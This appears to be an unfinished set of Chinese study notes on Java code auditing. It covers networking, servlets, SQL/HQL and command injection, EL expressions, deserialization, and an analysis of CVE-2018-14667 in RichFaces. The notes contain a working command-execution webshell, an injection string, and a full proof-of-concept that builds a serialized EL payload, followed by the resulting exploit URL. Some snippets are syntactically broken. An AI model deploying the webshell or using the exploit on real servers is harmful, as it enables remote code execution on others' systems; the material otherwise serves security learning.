# Java代码审计
# §0 网络通信
## §0.1 URL类

统一资源定位器（Uniform Resource Locatoer，URL）用于访问服务器上的资源，其格式大致为`<Protocol>://[<Username>:<Password>@]<Host>:<Port>/<File>[?<Parameter>][#<Anchor>]`。Java在`java.net.URL`中定义了`URL`类，其常用构造方法如下：
```java
class URLConstructor{  
    public static void main(String[] args) throws MalformedURLException {  
	    
	    // URL(String spec)
        URL url1 = new URL("http://user:password@www.baidu.com:80/index.html?id=1#Chapter-1");  
    
        // URL(String protocol, String host, int port, String file)
        URL url2 = new URL("http","www.baidu.com",80,"/index.html");

		// URL(String protocal, String host, String file)
        URL url3 = new URL("http","www.baidu.com","/index.html");

		// URL(URL context, String spec)
        URL url4_1 = new URL("http://www.baidu.com");  
        URL url4 = new URL(url4_1,"/index.html");  
        
    }  
}
```
`URL`实例提供了各种方法获取URL的各种属性：
|             属性             |         方法名         |   返回字符串示例   |
| :--------------------------: | :--------------------: | :----------------: |
| 域名和端口（Authority Part） |  `url.getAuthority()`  | `www.baidu.com:80` |
|           默认端口           | `url.getDefaultPort()` |        `80`        |
|             端口             |    `url.getPort()`     |        `80`        |
|             文件             |    `url.getFile()`     | `/index.html?id=1` |
|             域名             |    `url.getHost()`     |  `www.baidu.com`   |
|             路径             |    `url.getPath()`     |   `/index.html`    |
|             协议             |  `url.getProtocol()`   |       `http`       |
|           请求参数           |    `url.getQuery()`    |   `id=1&name=2`    |
|   标签（Anchor/Reference）   |     `url.getRef()`     |    `Chapter-1`     |
|     用户信息（UserInfo）     |  `url.getUserInfo()`   |  `user:password`   |
URL实例可以单向访问资源，配合`InputStream`对象实现I/O操作：

```java
public static void main(String[] args) throws IOException {  
    URL url = new URL("https://www.baidu.com/");  
    InputStreamReader inputStreamReader = new InputStreamReader(url.openStream());  
    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);  
    String buffer;  
    while((buffer=bufferedReader.readLine())!=null){  
        System.out.println(buffer);
			// <!DOCTYPE html>
			// <!--STATUS OK--> <html> <head> ...
    }  
    bufferedReader.close();  
}
```
如果要实现双向通信，应配合`URLConnection`类使用：
```java
public static void main(String[] args) throws IOException {	
	URL url = new URL("https://www.baidu.com/");  
	URLConnection urlConnection = url.openConnection();  
	PrintStream printStream = new PrintStream(urlConnection.getOutputStream());  
	printStream.println("id=1");  
	DataInputStream dataInputStream = new DataInputStream(urlConnection.getInputStream());  
	dataInputStream.readLine();
	}
```
## §0.2 Socket
```mermaid
flowchart LR

    subgraph User

        direction TB

        SocketClientThread["Socket(Host,Port)"]

        SocketClientThread--"socket.getInputStream()"-->InputStreamReaderClient["InputStreamReader"]

            --"new BufferedReader<br>(inputStreamReader)"-->BufferedReaderClient["BufferedReader"]

            --"bufferedReader.readLine()"-->StringClient["String"]-->ShutdownClient

        SocketClientThread--"socket.getOutputStream()"-->OutputStreamWriterClient["OutputStreamWriter"]

            --"new BufferedWriter<br>(outputStreamWriter)"-->BufferedWriterClient["BufferedWriter"]

            --"new PrintWriter<br>(bufferedWriter)"-->PrintWriterClient["PrintWriter"]

            --"printWriter.println(String)"-->Request[/"Request"/]-->ShutdownClient

            Request-->StringClient

        ShutdownClient["socket.close()"]

    end

    subgraph Server

        direction TB

        ServerSocket["ServerSocket(Port)"]--"serverSocket.accept()"-->SocketServerThread["Socket"]

        SocketServerThread--"socket.getInputStream()"-->InputStreamReaderServer

            --"new BufferedReader<BR>(inputStreamReader)"-->BufferedReaderServer

            --"bufferedReader.readLine()"-->StringServer["String"]

            -->ShutdownServer

        SocketServerThread--"socket.getOutputStream()"-->OutputStreamWriterServer["OutputStreamWriter"]

            --"new BufferedWriter<br>(outputStreamWriter)"-->BufferedWriterServer["BufferedWriter"]

            --"bufferWriter.println(String)"-->Response[/"Response"/]

            -->ShutdownServer

        StringServer-->BufferedWriterServer

        ShutdownServer["socket.close()<br>serverSocket.close()"]

    end

    User--"Socket Request"-->Server

    Server--"Socket Response"-->User
```
```java
public CustomizeSocket {

	public void server throws IOException {
		ServerSocket serverSocket = new ServerSocket(8080);  
	    Socket socket = serverSocket.accept();  
	    System.out.println(socket);  
	    InputStreamReader inputStreamReader = new InputStreamReader(socket.getInputStream());  
	    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);  
	    OutputStreamWriter outputStreamWriter = new OutputStreamWriter(socket.getOutputStream());  
	    BufferedWriter bufferedWriter = new BufferedWriter(outputStreamWriter);  
	    PrintWriter printWriter = new PrintWriter(bufferedWriter, true);  
	    String buffer;  
	    while((buffer = bufferedReader.readLine()) != '自定义END结尾'){  
	        System.out.println(str);  
	        printWriter.println(str);  
	    }  
	    socket.close();  
	    serverSocket.close(); 
	}

	public void client() throws IOException {  
	    InetAddress address = InetAddress.getByName(null);  
	    Socket socket = new Socket(address,8080);  
	    InputStreamReader inputStreamReader = new InputStreamReader(socket.getInputStream());  
	    BufferedReader bufferedReader = new BufferedReader(inputStreamReader);  
	    OutputStreamWriter outputStreamWriter = new OutputStreamWriter(socket.getOutputStream());  
	    BufferedWriter bufferedWriter = new BufferedWriter(outputStreamWriter);  
	    PrintWriter printWriter = new PrintWriter(bufferedWriter,true);  
	    printWriter.println("Message");  
	    String buffer = bufferedReader.readLine();  
	    printWriter.println("自定义END结尾");  
	    socket.close();  
	}

}
```

# §1 Java Web
新建一个Java Web项目，命名为`WebApp`，目录如下所示：
```shell
D:.
└─src
   ├─main
   │  ├─java // .java文件
   │  │  └─com
   │  │      └─example
   │  │          └─webapp
   │  ├─resources
   │  │  └─META-INF // 资源配置文件
   │  └─webapp      // .jsp
   │      └─WEB-INF // 路由配置文件
   └─test
      ├─java
      └─resources

```
## §1.1 JSP
在`/src/webapp`内新建一个`CurrentTime.jsp`：
```jsp
<%@ page import="java.util.Date" %>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
	<head>
    	<title>Title</title>
	</head>
	<body>
    	Now time is <%= new Date() %>
	</body>
</html>
```
访问`http://localhost:8080/WebApp_war_exploded/CurrentTime.jsp`：

```shell
C:\> curl -v http://localhost:8080/WebApp_war_exploded/CurrentTime.jsp
*   Trying 127.0.0.1:8080...
* Connected to localhost (127.0.0.1) port 8080 (#0)
> GET /WebApp_war_exploded/CurrentTime.jsp HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.79.1
* Mark bundle as not supporting multiuse
< HTTP/1.1 200
< Set-Cookie: JSESSIONID=<32BitsHex>; Path=/WebApp_war_exploded; HttpOnly
< Content-Type: text/html;charset=UTF-8
< Content-Length: 127
< Date: Tue, 07 Jun 2022 06:47:35 GMT
<html>
	<head>
    	<title>Title</title>
	</head>
	<body>
    	Now time is Tue Jun 07 14:47:35 CST 2022
	</body>
</html>
* Connection #0 to host localhost left intact
```

## §1.2 Servlet

在`/src/java`内新建`com.example.webapp.HelloWorld.java`：

```java
package com.example.webapp;

import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;

public class HelloWorld extends HttpServlet {
    @Override protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
        PrintWriter printWriter = response.getWriter();
        printWriter.println("<html><body><a>Hello World</a></body></html>");
        printWriter.flush();
    }
}
```

向`/src/webapp/WEB-INF/web.xml`添加配置：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                             http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
         version="4.0">
    <display-name>Servlet Demo</display-name>
    <description>A demo</description>
    <servlet>
        <servlet-name>HelloWorldApp</servlet-name>
        <servlet-class>com.example.webapp.HelloWorld</servlet-class>
    </servlet>
    <servlet-mapping>
        <servlet-name>HelloWorldApp</servlet-name>
        <url-pattern>/HelloWorld</url-pattern>
    </servlet-mapping>
</web-app>
```

访问`http://localhost:8080/WebApp_war_exploded/HelloWorld`：

```shell
C:\> curl -v http://localhost:8080/WebApp_war_exploded/HelloWorld
	<html><body><a>Hello World</a></body></html>
```

## §1.3 JavaBean

`JavaBean`是一种抽象的开发模式。普通的JSP只是一门脚本语言，与其它面向过程的语言并无区别，而`JavaBean`引入了面向对象的概念，使得各个组件可以有机的集成起来。

在`src/java`内创建`com.example.webapp.TryYourLuck.java`：

```java
package com.example.webapp;

public class TryYourLuck {
    private boolean isLucky;
    public TryYourLuck(){
        isLucky = Math.random() > 0.5;
    }
    public boolean isLucky(){
        return this.isLucky;
    }
}
```

在`src/webapp`内创建`TestYourLuck.jsp`：

```java
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<%@ page import="com.example.webapp.TryYourLuck" %>
<html>
<head>
    <title>Are you lucky today?</title>
</head>
<body>
    <%
        TryYourLuck instance = new TryYourLuck();
        if(instance.isLucky()){
            out.println("You are lucky! :)");
        }else{
            out.println("You are unlucky! :(");
        }
    %>
</body>
</html>
```



# §2 注入

## §2.1 SQL注入
JDK自带`java.sql.*`包用于建立与SQL的连接。然而SQL种类多种多样，有`Microsoft SQL`、`MySQL`、`MariaDB`、`PostrageSQL`、`SQLite`等，它们被开发时用的语言不同，唯一的共同点是遵循SQL语法，因此仅凭这一个软件包还不够，必须使用各大SQL厂商各自开发的`.jar`格式的`Driver`。
### §2.1.1 原生JDBC
```Java
import java.sql.*;  

public class DatabaseConnector {  
    
    private Connection connection; 
     
    private void open() throws SQLException {  
        connection = DriverManager.getConnection( // 指定数据库端口、用户名、密码
                "jdbc:mariadb://localhost:3306",  
                "admin","admin"  
        );
        if(connection.isValid(5)){ // 判断连接是否成功/超时
            System.out.println("Success");  
        }else{  
            System.out.println("TimeOut");  
        }
        connection.close(); // 关闭连接
    }
    
    public static void main(String[] args){  
        DatabaseConnector connector = new DatabaseConnector();  
        try{  
            connector.open();
	            // 导入jar包时
	            // Success
        }catch (SQLException e){  
            e.printStackTrace();
	            // 未导入jar包时
	            // java.sql.SQLException:
	            // No suitable driver found for jdbc:mariadb://localhost:3306
        }  
    }  
    
}
```
滥用字符串拼接会导致SQL注入：
```java
public class DatabaseConnector{
    // ...
	private void queryByName(String name) throws SQLException {  
	    String sqlCommand = "select * from user where name = " + name;  
	    Statement statement = connection.createStatement(); // 更改ResultSet的特性  
	    ResultSet resultSet = statement.executeQuery(sqlCommand); // Statement实例只能使用一次，生成一个ResultSet实例
	    while(resultSet.next()){  
	        System.out.println("id:" + resultSet.getObject("id"));  
	        System.out.println("name:" + resultSet.getObject("name"));  
	    }  
	}
}
```
`PreparedStatement`类支持替换SQL语句字符串中的占位符`?`，其内部的`setInt()`、`setString()`等方法会对参数进行严格的类型检查和转换，以避免SQL注入：
```java
public class DatabaseConnector{
	// ...
	private void QueryByName_safe(String name) throws SQLException {
		String sqlCommand = "select * from user where name = ?";  
		PreparedStatement preparedStatement = connection.prepareStatement(sqlCommand); // PreparedStatement实例可重复使用，批量生成ResultSet实例
		preparedStatement.setString(1,name); // 将name转换为String，并用其替换第一个占位符
		ResultSet resultSet = preparedStatement.executeQuery();  
// ...
	}
}
```
### §2.1.2 MyBatis框架
`MyBatis`是一个`JDBC`的抽象封装框架，其核心思想是将SQL语句从源文件移动到配置文件中，从而避免源文件出现大量的SQL语句，提高源文件可维护性。其模版大致如下：
```xml
<mapper namespace="UserInfoSection">
	<select id="queryByName" resultType="String" parameterType="String">
		select * from user where name = #{name}
	</select>
</mapper>
```
```java
import org.apache.ibatis.session.SqlSession

public class UserInfoSection {

	private SqlSession sqlSession;

	public UserInfoSection(SqlSession sqlSession){
		this.sqlSession = sqlSession;
	}

	public String queryByName(String name){
		return 
			"id:" +
			this.sqlSession.selectOne("DatabaseConnector.queryByName",name) +
			"name:" +
			name;
	}

}
```
XML中可以使用两种不同的传参方式：`${Parameter}`和`#{Parameter}`。`${Parameter}`采用字符串拼接的方式，会造成SQL注入；而`#{Parameter}`采用预编译的方式，不会有安全风险。在使用`MyBatis`框架的时候应格外注意选择哪种传参方式。
### §2.1.3 Hibernate框架
`Hibernate`框架是一种满足Java持久化API（Java Persistence API，JPA）要求的框架。其它语言传统的SQL查询方式，是将数据库信息通过值传递，赋给目标编程语言的某个实例。而JPA将数据库中的对象**实时**映射到某个实例。例如某次查询之后，数据库的值发生改变，则JPA最终输出的是新的值。
Hibernate使用的不是SQL，而是HQL，二者逻辑相似，但语法上略有区别：
```java

class QueryUserInfo {

	public QueryUserInfo(String parameter){
		Configuration config = new Configuration().configure();
		SessionFactory factory = config.buildSessionFactory();
		Session session = factory.openSession();
		try{
			Transction transction = session.beginTransction();
			String HqlCommand = "FROM USER WHERE NAME = '" + parameter + "'";
			List users = session.createQuery(HqlCommand,User.class).getResultList();
			Iterator iterator = users.iterator();
			while(iterator.hasNext()){
				User user = (User) iterator.next();
				System.out.println(user.toString());
			}
		}catch(HibernateException e){
			if(transaction != null){ transaction.rollback(); }
		}finally{
			session.close();
		}
	}

	public static void main(String[] args){
		QueryUserInfo("abc' or '1'='1"); // HQL注入
	}

}
```
可以使用HQL参数绑定的方式规避该问题：
+ 位置参数
  ```java
  Query<User> query = session.createQuery("FROM USER WHERE NAME = ?1",User.class);
  query.setParameter("1",parameter); // String parameter;
  ```
+ 命名参数
  ```java
  Query<User> query = session.createQuery("FROM USER WHERE NAME = ?1",User.class);
  query.serParameter("name",parameter); // String parameter;
  ```
+ 命名参数列表
  ```java
  List<String> names = Arrays.asList(parameter1,parameter2);
  Query<User> query = session.createQuery("FROM USER WHERE NAME = (:names)",User.class);
  query.setParameter("name",names);
  ```
+ 类实例
  ```java
  User user1;
  user1.setName(parameter);
  Query<User> query = session.createQuery("FROM USER WHERE NAME =:name",User.class);
  query.setProperties(user1);
  ```
## §2.2 命令注入
`Runtime`类可以用于调用系统命令，下面是一个典型的`WebShell`：
```java
class WebShell{  
    protected void doGet(HttpServletRequest request, HttpServletResponse response) 
    throws IOException {  
        String cmd = request.getParameter("cmd");
        Process process = Runtime.getRuntime().exec(cmd);
        InputStream in = process.getInputStream();
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        byte[] b = new byte[1024];
        int i;
        while((i=in.read(b))!=-1){
            byteArrayOutputStream.write(b,0,i);
        }
        PrintWriter out = response.getWriter();
        out.println(byteArrayOutputStream);
    }  
}
```

访问`localhost:8080/WebApp_war_exploded/WebShell?cmd=whoami`：

```shell
C:\> curl -v localhost:8080/WebApp_war_exploded/WebShell?cmd=whoami
	desktop-d9m390b\Administrator
```

> [注意](https://stackoverflow.com/questions/4031390/executing-cmd-exe-commands-from-java)：Linux的`Runtime`调用的Shell**只能执行文件**。
>
> 在Windows中，`dir`、`cd`等命令是内置于Shell的，而不是统一放在`C:\Windows\System32`中的`.exe`可执行文件，因此执行失败。之所以`whoami`可以执行，是因为系统目录真的有个叫做`whoami.exe`的程序；而尝试执行`dir`时，则会遇到`500 Interal Server Error`：`java.io.IOException: Cannot run program "dir": CreateProcess error=2, 系统找不到指定的文件`。
>
> 在Linux中，万物皆文件，Shell执行的所有命令都是`/bin`内的可执行二进制文件，因此Linux不会出现这种问题。
>
> 对于这种问题，我们可以**用Java创建的Shell再创建一个Shell**，例如`?cmd=cmd.exe /c dir`

对于常见的`pingShell`，我们常常需要将两条命令拼接到一起。以下是各大操作系统常用的连接符：

|   OS    |     Shell      | 同时执行多条命令 | 顺序实行多条命令 | 顺序执行多条命令（仅当前命令执行成功时） | 顺序执行多条命令（仅当前命令执行失败时） | Pipe Operator | Group/Nest Multiple Commands | Seperate Parameter | Run in Background |
| :-----: | :------------: | :--------------: | :--------------: | :--------------------------------------: | :--------------------------------------: | :-----------: | :--------------------------: | :----------------: | :---------------: |
| Windows | Command Prompt |       `&`        |                  |                   `&&`                   |                   `||`                   |      `|`      |            `( )`             |      `;`或`,`      |                   |
| Windows |   Powershell   |       `&`        |       `;`        |                   `&&`                   |                   `||`                   |      `|`      |            `( )`             |                    |                   |
|  Linux  |      bash      |       `&`        |       `;`        |                   `&&`                   |                   `||`                   |      `|`      |            `( )`             |                    |     ` ... &`      |

幸运的是，以上连接符对于Java而言全部失效，因为Java会将拼接而成的字符串当作一条命令发给本机Shell，Shell得知这是一整条命令，于是只执行第一条命令。即使使用`cmd.exe /c (A&&B)`也无法绕过，因为参数`/c`中的所有连接符都会被首先解析成主命令的连接符，真正执行的命令是`/c`中的第一条命令。所以Java没有`pingShell`之类的安全问题。

是谁告诉Shell这是一整条命令的呢？我们从`Runtime`类的源码入手：

```java
public class Runtime {
    
    public Process exec(String command) throws IOException {
        return exec(command,null,null);
    }
    
    public Process exec(String command, String[] envp, File dir) throws IOException {
        if(command.isEmpty()){ 
            throw new IllegalArgumentException("Empty Command"); 
        }
        StringTokenizer st = new StringTokenizer(command); // 使用StringTokenizer类处理command
        String[] cmdarray = new String[st.countTokens()];
        for(int i = 0 ; st.hasMoreTokens() ; i++){ // 将command的分割结果传入字符串数组中
            cmdarray[i] = st.nextToken();
        }
        return exec(cmdarray,envp,dir);
    }
    
    public Process exec(String[] cmdarray, String[] envp, File dir) throws IOException {
        return new ProcessBuilder(cmdarray).environment(envp).directory(dir).start();
    }
    
}
```

`StringTokenizer`对传入的字符串`command`进行处理，然后将处理结果传入字符串数组`cmdarray`。然而我们发现，当字符串`command`为`ping localhost && whoami`时，得到的字符串数组却为：`ping`，`localhost && whoami`，因此`cmdarray`并不是我们想要的结果。

## §2.3 代码注入

？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？？TODO

将用户输入的数据作为代码执行，容易造成代码注入。

例如下面的车辆信息管理系统，用户输入车的种类、车的方法名、车的方法所需的参数，从而实例化一辆车：

```java
class Truck {} // ...
class Bike {} // ...
class Jeep {} // ...

public class CarConstructor {
    public CarConstructor(String className,String methodName,String[] args) {
        try {
            Class carClass = Class.forName(className);
            Constructor carConstructor = carClass.getConstructor(String[].class);
            Object carObject = carConstructor.newInstance(new Object[]{args});
            Method carMethod = carClass.getMethod(methodName);
            carMethod.invoke(carObject);
        }catch(ClassNotFoundException e){
            System.out.println("没有这种车!");
        }catch(NoSuchMethodException e){
            System.out.println("这种车不能实现这种操作!");
        }catch(InvocationTargetException e){
            System.out.println("底层构造方法出现错误!");
        }catch(IllegalAccessException e){
            System.out.println("不能访问车实例的私有方法!");
        }catch(InstantiationException e){
            System.out.println("不能实例化抽象类!");
        }
    }
}
```







```java
public class Evil {
    public static void Exec(String arg) throws Exception {
        Process process = Runtime.getRuntime().exec(arg);
        InputStreamReader inputStreamReader = new InputStreamReader(process.getInputStream());
        BufferedReader bufferedReader = new BufferedReader(inputStreamReader);
        StringBuffer stringBuffer = new StringBuffer();
        String line;
        while((line = bufferedReader.readLine()) != null){
            stringBuffer.append(line).append('\n');
        }
        String result = stringBuffer.toString();
        throw new Exception(result);
    }
}
```



## §2.4 表达式注入

EL表达式（Expression Language）是一种可以内置在JSP中的语言，其功能十分强大：

- 任意访问JSP的四大作用域（`page`、`request`、`session`、`application`）
  - `page`：在单个页面内，由`Javax.servlet.jsp.PageContext`抽象类实现
  - `request`：在单个请求中，由`Javax.servlet.httpServletRequest`类实现
  - `session`：在单个会话中，由`Javax.servlet.http.HttpSession`类实现
  - `application`：在整个服务器中，全部用户共享，由`Javax.servlet.ServletContext`类实现
- 执行基本逻辑原酸
- 任意调用EL表达式内置的隐式对象
  - `pageScope`：`page`作用域
  - `requestScope`：`request`作用域
  - `sessionScope`：`session`作用域
  - `applicationScope`：`application`作用域
  - `param`：`Request`对象的参数，是字符串
  - `paramValues`：`Request`对象的参数，是字符串数组
  - `header`：`HTTP`信息头，字符串
  - `headerValues`：`HTTP`信息头，字符串集合
  - `initParam`：上下文初始化参数
  - `cookie`：`Cookie`值
  - `pageContext`：当前页面的`pageContext`
- 任意调用Java类

EL表达式获取`<object>`对象中`<name>`字段的方式有以下两种，其中`<object>`缺省为`pageScope`，若未找到`name`字段，则从`requestScope`、`sessionScope`、`applicationScope`依次向上层作用域隐式对象进行查找：

- `${[<object>.]<name>}`，这种方法允许缺省`<object>`
- `${<object>[<name>]}`，如果`<name>`包含特殊字符，需要在两侧加上双引号，即`${<object>["<name>"]}`。这种方法允许访问包含特殊字符的变量名。

> 我们知道，类的字段名也是标识符，同样符合`/[0-9A-Za-z_]+/`，每个符号都十分正常。之所以会有”特殊符号“这一说，是因为客户端传的键值对（尤其是键）可以包含特殊字符，比如`?user-@name=abc$!;def`就是合法的。

```jsp
<%@ page contentType="text/html;charset=UTF-8" language="java" %>
<html>
	<body>
		<a>你输入的文本是:${requestScope[text]}</a>
	</body>
</html>
```

？？？？？？？？？？？？？？？？？？？？TODO：













# §3 反序列化

在Java中，序列化由`ObjectOutputStream`类的`writeObject()`方法实现，反序列化由`ObjectInputStream`的`readObject()`实现。被序列化的的类必须实现`Serializable`接口或其子类`Externalizable`接口。

反序列化漏洞必须同时满足两个条件：存在利用链、存在触发点。

### §3.1 Apache系列反序列化漏洞原理









### §3.2 FastJson反序列化漏洞原理

FastJson反序列化使用的是自定义的一套流程。

```mermaid
flowchart LR
	Version1.2.24["1.2.24"]
		-->Version1.2.41["1.2.41"]
		-->Version1.2.42["1.2.42"]
		-->Version1.2.45["1.2.45"]
		-->Version1.2.47["1.2.47"]
		-->Version1.2.68["1.2.68"]
	Version1.2.24.->FirstBug["第一次被发现反序列化漏洞"]
	Version1.2.41.->BlackListBypassBug1["黑名单绕过漏洞"]
	Version1.2.42.->BlackListBypassBug2["黑名单绕过漏洞"]
	Version1.2.45.->GadgetChain["新利用链"]
	Version1.2.47.->AutoTypeBypass1["AutoType绕过"]
	Version1.2.68.->AutoTypeBypass2["AutoType绕过"]
```













# ??? CVE-2018-14667 RichFaces 反序列化RCE

# 0x01 前情提要

`RichFaces`框架集成了一系列支持Ajax的UI组件。









根据[cve.org](https://www.cve.org/CVERecord?id=CVE-2018-14667)的介绍，CVE-2018-14667是由于`RichFaces`框架在[3.0,3.3.4]版本内解析EL表达式而造成的远程代码执行漏洞。

> The RichFaces Framework 3.X through 3.3.4 is vulnerable to Expression Language (EL) injection via the UserResource resource. A remote, unauthenticated attacker could exploit this to execute arbitrary code using a chain of java serialized objects via org.ajax4jsf.resource.UserResource$UriData.

# 0x02 配置环境

> 注意：RichFaces在2016年6月迎来了最后一次更新，最终版本停留在了`4.5.17.final`。虽然其官网在Redhat的赞助下仍能正常访问，但是下载页面的`Release Note`链接已经404。观察最新版本的下载链接`http://downloads.jboss.org/richfaces/releases/3.3.X/3.3.4.Final/darkX-3.3.4.Final.jar`，可以大致推测其他版本的路径。

# 0x03 分析

官网说引起反序列化的类为`org.ajax4jsf.resource.UserResource$UriData`，我们先定位到此处：

```java
//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package org.ajax4jsf.resource;

import java.io.IOException;
import java.io.OutputStream;
import java.io.Serializable;
import java.util.Date;
import javax.el.ELContext;
import javax.el.MethodExpression;
import javax.el.ValueExpression;
import javax.faces.component.UIComponent;
import javax.faces.component.UIComponentBase;
import javax.faces.context.FacesContext;

public class UserResource extends InternetResourceBase 

    public Object getDataToStore(FacesContext context, Object data) {
        UriData dataToStore = null;
        if (data instanceof ResourceComponent2) {
            ResourceComponent2 resource = (ResourceComponent2)data;
            dataToStore = new UriData();
            dataToStore.value = resource.getValue();
            dataToStore.createContent = UIComponentBase.saveAttachedState(context, resource.getCreateContentExpression());
            if (data instanceof UIComponent) {
                UIComponent component = (UIComponent)data;
                ValueExpression expires = component.getValueExpression("expires");
                if (null != expires) {
                    dataToStore.expires = UIComponentBase.saveAttachedState(context, expires);
                }

                ValueExpression lastModified = component.getValueExpression("lastModified");
                if (null != lastModified) {
                    dataToStore.modified = UIComponentBase.saveAttachedState(context, lastModified);
                }
            }
        }

        return dataToStore;
    }

    public void send(ResourceContext context) throws IOException {
        UriData data = (UriData)this.restoreData(context);
        FacesContext facesContext = FacesContext.getCurrentInstance();
        if (null != data && null != facesContext) {
            ELContext elContext = facesContext.getELContext();
            OutputStream out = context.getOutputStream();
            MethodExpression send = (MethodExpression)UIComponentBase.restoreAttachedState(facesContext, data.createContent);
            send.invoke(elContext, new Object[]{out, data.value});

            try {
                out.flush();
                out.close();
            } catch (IOException var8) {
            }
        }

    }

	// ...

    public static class UriData implements Serializable {
        private static final long serialVersionUID = 1258987L;
        private Object value;
        private Object createContent;
        private Object expires;
        private Object modified;

        public UriData() {
        }
    }
}

```

利用链如下：

```mermaid
flowchart LR
	subgraph org.ajax4jsf.webapp.BaseFilter
		doFilter["doFilter()"]
	end
	subgraph org.ajax4jsf.resource.InternetResourceService
		serviceResource["serviceResource()"]
	end
	subgraph java.io.ObjectInputStream
		readObject["readObject()"]
	end
	subgraph org.ajax4jsf.resource.ResourceLifeCycle
		sendResource["sendResource()"]
	end
	subgraph org.ajax4jsf.resource.ResourceBuilderImpl
		getResourceForKey["getResourceForKey()"]
		decrypt["decrypt()"]
		createUserResource["createUserResource()"]
	end
	subgraph org.ajax4jsf.resource.UserResource
		send["send()"]
	end
	subgraph javax.faces.component.StateHolderSaver
		restore["restore()"]
	end
	subgraph org.jboss.al.MethodExpressionImpl
		invoke["invoke()"]
	end
	doFilter-->serviceResource
		-->getResourceForKey
		-->decrypt
		-->readObject
		-->sendResource
		-->createUserResource
		-->send
		-->restore
		-->invoke
```

Poc：

```java
public class CVE_2018_14667{
    private static Codec codec = new Codec();
    protected static byte[] encrypt(byte[] src){
        try {
            Deflater compressor = new Deflater(1);
            byte[] compressed = new byte[src.length + 100];
            compressor.setInput(src);
            compressor.finish();
            int totalOut = compressor.deflate(compressed);
            byte[] zipsrc = new byte[totalOut];
            System.arraycopy(compressed,0,zipsrc,0,totalOut);
            compressor.end();
            return codec.encode(zipsrc);
        } catch(Exception e) {
			throw new FacesException("Can't encode resource data",e);
		}
	}
            
	public static void main(String[] args) throws ClassNotFoundException, IOException {
        String poc =
            "#{request.getClass.getClassLoader().loadClass(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null).exec(\"calc\")}";
		Class targetClass = Class.forName("org.ajax4jsf.resource.UserResource$UriData");
		Constructor constructor = targetClass.getDeclaredConstructors()[0];
		constructor.setAccessible(true);
		Object object = constructor.newInstance();
		Class[] arg = new Class[]{javax.el.MethodExpression.class};
		MethodExpressionImpl methodExpression = new MethodExpressionImpl(poc,null,null,null,null,arg);
		StateHolderSaver exp = new StateHolderSaver(null,methodExpression);
		Reflections.setFiled(object,"createContent",exp);
		ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
		ObjectOutput output = new ObjectOutputStream(byteArrayOutputStream);
		output.writeObject(object); 
		byte[] result = encrypt(byteArrayOutputStream.toByteArray());
		System.out.println("/"+ new String(result, StandardCharsets.UTF_8) + ".jsf");	
	}
}
```

得到恶意URL：

```
http://127.0.0.1:80/a4j/s/3_3_0.GAorg.ajax4jsf.resource.UserResource/n/s/-1487394660/DATA/eAF9kb9rFEEUx18Ogz9iCj0wWKTIKnJnMddolVhFMcKeQpYIJtW72XfnrLMzczOzl8VDuzRpLNLa2SaVf4GtYJP!wCoEEYJg7-zukSCIU82b-c7nfd93Dn!CvLNwX9sRwwzLB5kbMktOF5YT23JkN2fF3S0rHqNHqFb74Y8WXIphkVtCT-taeVLew804wwn2JKpR78UgI-5XY7hMpRGBOYb3MBfDlVynYigondXzE5QF1UVpgpd7FaJkQ-TkGNe50SqwWeJDow0tU7IJTsi--vr50cHHb!0WtGK4yiU69xxz-ttD4q1Qo-Dhmgtv0prh4VbjUuheQlagFG9xIGm1NFX7lSqKbKCdYyRZn!xrnT4pTfDvhFbPciMHZ0u!F77c6F8HKC3cbuz-QzuOlxa2P3w!a9W69rnugvZpbz!5tX28VinM7hR270wtjQtyno3Ir1czdbrn21hjGD4cyLBpLqMKyqq42WahvMgpqvWN7U4UKBfnQk30G-qoQsouo5J4J-IoedR9B1BYaO!UsTS0WXBHxy9PTpenT2uD4d!n!H!mNSYkaP4ALHfPHA__.jsf
```











6月23日第一次重新开始编辑时为2w+字。